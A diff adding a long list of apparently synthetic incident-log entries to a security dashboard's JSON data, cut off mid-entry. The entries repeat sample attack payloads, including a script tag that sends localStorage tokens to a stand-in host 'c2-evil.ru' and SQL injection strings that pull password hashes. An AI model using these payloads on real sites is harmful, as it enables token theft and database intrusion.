@@ -55,6 +55,5505 @@
   ],
   "incidentLogs": [
     {
+      "id": "inc-1791297170019",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:02:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297168016",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:02:48",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297164003",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "20:02:44",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297161993",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "20:02:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297157971",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:02:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297153956",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "20:02:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297151952",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "20:02:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297143923",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:02:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297139917",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "20:02:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297137911",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:02:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297135909",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "20:02:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297131901",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "20:02:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297127895",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "20:02:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297125887",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "20:02:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297121884",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "20:02:01",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297119882",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "20:01:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297117874",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "20:01:57",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297113857",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "20:01:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297111855",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "20:01:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297109848",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "20:01:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297107848",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "20:01:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297105838",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:01:45",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297103825",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "20:01:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297101819",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:01:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297097811",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "20:01:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297095807",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:01:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297087780",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:01:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297085773",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:01:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297081758",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "20:01:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297079745",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "20:01:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297077734",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:01:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297071716",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:01:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297067699",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "20:01:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297065697",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "20:01:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297063693",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "20:01:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297059677",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:00:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297057676",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "20:00:57",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297055675",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:00:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297053669",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:00:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297049658",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:00:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297041628",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:00:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297039625",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "20:00:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297037620",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "20:00:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297035615",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:00:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297033602",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:00:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297027581",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "20:00:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297023561",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:00:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297019552",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "20:00:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297017536",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "20:00:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297015525",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "20:00:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297005508",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "20:00:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791297001492",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "20:00:01",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296999488",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:59:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296991463",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:59:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296987444",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:59:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296981426",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:59:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296979425",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:59:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296977412",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:59:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296973381",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:59:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296971380",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:59:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296969378",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:59:29",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296967378",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:59:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296963363",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:59:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296959344",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:59:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296951314",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:59:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296949308",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:59:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296947306",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:59:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296945300",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:59:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296943294",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:59:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296941280",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:59:01",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296937265",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:58:57",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296935261",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:58:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296931246",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:58:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296929233",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:58:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296925232",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:58:45",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296923226",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:58:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296921213",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:58:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296919198",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:58:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296917182",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:58:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296915182",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:58:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296913180",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:58:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296909159",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:58:29",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296907147",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:58:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296903138",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:58:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296901130",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:58:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296899116",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:58:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296897112",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:58:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296893102",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:58:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296891098",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:58:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296889097",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:58:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296887094",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:58:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296885089",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:58:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296879080",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:57:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296877068",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:57:57",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296875052",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:57:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296873037",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:57:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296871037",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:57:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296859015",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:57:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296857008",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:57:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296848980",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:57:28",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296846972",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:57:26",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296844959",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:57:24",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296840947",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:57:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296838936",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:57:18",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296832904",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:57:12",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296830902",
+      "ip": "45.33.32.156",
